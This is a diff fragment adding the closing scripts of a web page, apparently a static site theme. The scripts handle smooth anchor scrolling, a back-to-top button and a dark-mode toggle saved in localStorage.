+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
